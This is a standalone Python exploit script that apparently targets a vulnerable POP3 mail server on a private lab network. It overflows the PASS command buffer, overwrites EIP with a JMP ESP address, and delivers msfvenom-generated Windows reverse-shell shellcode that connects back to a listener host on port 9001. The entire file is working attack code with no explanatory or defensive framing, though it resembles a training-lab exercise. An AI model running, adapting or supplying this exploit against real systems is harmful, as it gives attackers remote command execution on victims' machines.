
import socket

host = "192.168.56.103"
port = 110

# msfvenom -p windows/shell_reverse_tcp LHOST=192.168.56.101 LPORT=9001 -b '\x00\x0a\x0d' -f py
buf = b"\xd9\xc4\xbb\x54\xdf\xa4\xba\xd9\x74\x24\xf4\x5f\x29"
buf += b"\xc9\xb1\x52\x31\x5f\x17\x03\x5f\x17\x83\x93\xdb\x46"
buf += b"\x4f\xe7\x0c\x04\xb0\x17\xcd\x69\x38\xf2\xfc\xa9\x5e"
buf += b"\x77\xae\x19\x14\xd5\x43\xd1\x78\xcd\xd0\x97\x54\xe2"
buf += b"\x51\x1d\x83\xcd\x62\x0e\xf7\x4c\xe1\x4d\x24\xae\xd8"
buf += b"\x9d\x39\xaf\x1d\xc3\xb0\xfd\xf6\x8f\x67\x11\x72\xc5"
buf += b"\xbb\x9a\xc8\xcb\xbb\x7f\x98\xea\xea\x2e\x92\xb4\x2c"
buf += b"\xd1\x77\xcd\x64\xc9\x94\xe8\x3f\x62\x6e\x86\xc1\xa2"
buf += b"\xbe\x67\x6d\x8b\x0e\x9a\x6f\xcc\xa9\x45\x1a\x24\xca"
buf += b"\xf8\x1d\xf3\xb0\x26\xab\xe7\x13\xac\x0b\xc3\xa2\x61"
buf += b"\xcd\x80\xa9\xce\x99\xce\xad\xd1\x4e\x65\xc9\x5a\x71"
buf += b"\xa9\x5b\x18\x56\x6d\x07\xfa\xf7\x34\xed\xad\x08\x26"
buf += b"\x4e\x11\xad\x2d\x63\x46\xdc\x6c\xec\xab\xed\x8e\xec"
buf += b"\xa3\x66\xfd\xde\x6c\xdd\x69\x53\xe4\xfb\x6e\x94\xdf"
buf += b"\xbc\xe0\x6b\xe0\xbc\x29\xa8\xb4\xec\x41\x19\xb5\x66"
buf += b"\x91\xa6\x60\x28\xc1\x08\xdb\x89\xb1\xe8\x8b\x61\xdb"
buf += b"\xe6\xf4\x92\xe4\x2c\x9d\x39\x1f\xa7\x62\x15\x27\x52"
buf += b"\x0b\x64\x57\xbf\xe2\xe1\xb1\xd5\xe4\xa7\x6a\x42\x9c"
buf += b"\xed\xe0\xf3\x61\x38\x8d\x34\xe9\xcf\x72\xfa\x1a\xa5"
buf += b"\x60\x6b\xeb\xf0\xda\x3a\xf4\x2e\x72\xa0\x67\xb5\x82"
buf += b"\xaf\x9b\x62\xd5\xf8\x6a\x7b\xb3\x14\xd4\xd5\xa1\xe4"
buf += b"\x80\x1e\x61\x33\x71\xa0\x68\xb6\xcd\x86\x7a\x0e\xcd"
buf += b"\x82\x2e\xde\x98\x5c\x98\x98\x72\x2f\x72\x73\x28\xf9"
buf += b"\x12\x02\x02\x3a\x64\x0b\x4f\xcc\x88\xba\x26\x89\xb7"
buf += b"\x73\xaf\x1d\xc0\x69\x4f\xe1\x1b\x2a\x7f\xa8\x01\x1b"
buf += b"\xe8\x75\xd0\x19\x75\x86\x0f\x5d\x80\x05\xa5\x1e\x77"
buf += b"\x15\xcc\x1b\x33\x91\x3d\x56\x2c\x74\x41\xc5\x4d\x5d"

payload = b"A" * 2606           # EIP overwrite offset = 2606
payload += b"\xe1\xbc\x08\x76"  # overwrite EIP: JMP ESP
payload += b"\x90" * 12         # fix misaligned stacked with nops
payload += buf
payload += b"B" * (4000 - len(payload))

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
    print("[ ] Connecting to host...")
    s.connect((host,port))
    print("[+] Connected")

    print("[ ] Receiving data...")
    data = s.recv(1024)
    print("[+] Data received")

    print("[ ] Sending username...")
    s.send(b"USER foobar " + b"\r\n")
    print("[+] Username sent")

    print("[ ] Receiving data...")
    data = s.recv(1024)
    print("[+] Data received")

    print("[ ] Sending payload...")
    s.send(b"PASS " + payload + b"\r\n")
    print("[+] Exploit successful")

    s.close()
    
except:
    print("Could not connect to server!")